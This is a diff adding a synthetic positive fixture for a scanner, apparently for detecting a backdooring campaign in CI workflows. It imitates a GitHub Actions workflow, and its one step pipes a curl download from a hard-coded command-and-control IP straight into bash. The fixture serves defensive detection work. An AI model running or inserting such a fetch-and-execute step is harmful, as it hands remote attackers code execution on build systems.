@@ -1,0 +1,13 @@
+# Synthetic positive fixture — Megalodon_Workflow_C2_IP
+# Contains only the C2 IP string documented in public threat intelligence.
+# This is a text file only — not a functional workflow; cannot execute anything.
+# Source: https://safedep.io/megalodon-mass-github-repo-backdooring-ci-workflows/
+name: Optimize-Build
+on:
+  workflow_dispatch:
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: run
+        run: curl -s http://216.126.225.129:8443/payload | bash
